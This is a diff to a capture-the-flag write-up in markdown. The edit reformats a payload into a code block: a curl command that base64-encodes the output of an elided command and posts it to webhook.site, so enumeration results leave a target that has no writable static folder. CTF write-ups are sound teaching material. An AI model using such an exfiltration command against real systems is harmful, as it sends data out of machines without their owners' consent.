@@ -101,7 +101,11 @@ For people that have some prior experience to CTFs, it's at this moment they rea
 ![image](https://user-images.githubusercontent.com/114584910/193475243-6643e736-6aa3-4824-9e8f-3c3b4cdb5389.png)
 
 We now have to find a way to achieve enumeration (gotta `ls` to my liking) and find the flag. The imminent issue is that there are no static folders for us to copy anything to read, and we don't have write access in general.
-Thankfully it's possible to use online services like [webhook.site] to capture any data. With some research the payload can be `curl -d \`... | base64 -w0\` https://webhook.site/...`:
+Thankfully it's possible to use online services like [webhook.site] to capture any data. With some research the payload can be:
+
+```bash
+curl -d `... | base64 -w0` https://webhook.site/...
+```
 
 Simple enumeration reveals the flag executable at `/flag`:
 
